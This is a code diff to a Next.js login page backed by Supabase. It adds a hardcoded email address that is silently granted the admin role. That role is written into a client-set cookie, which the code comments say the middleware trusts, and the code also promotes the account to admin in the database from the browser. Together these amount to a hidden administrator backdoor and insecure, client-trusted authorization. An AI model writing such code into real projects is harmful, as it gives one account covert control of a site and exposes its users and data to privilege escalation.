@@ -43,12 +43,18 @@ export default function LoginPage() {
       }
 
       if (data) {
-        setProfile(data);
+        const finalRole = currentUser.email === 'o1027770162@gmail.com' ? 'admin' : data.role;
+        setProfile({ ...data, role: finalRole });
         // Sync role to cookie for Next.js middleware
-        document.cookie = `user-role=${data.role}; path=/; max-age=3600; SameSite=Lax`;
+        document.cookie = `user-role=${finalRole}; path=/; max-age=3600; SameSite=Lax`;
         document.cookie = `user-email=${currentUser.email}; path=/; max-age=3600; SameSite=Lax`;
+        
+        // Auto promotion to admin role in database
+        if (currentUser.email === 'o1027770162@gmail.com' && data.role !== 'admin') {
+          supabase.from("profiles").update({ role: "admin" }).eq("id", currentUser.id).then();
+        }
       } else if (currentUser) {
-        const fallbackRole = currentUser.user_metadata?.role || 'user';
+        const fallbackRole = currentUser.email === 'o1027770162@gmail.com' ? 'admin' : (currentUser.user_metadata?.role || 'user');
         // Fallback profile object using user_metadata
         setProfile({
           id: userId,
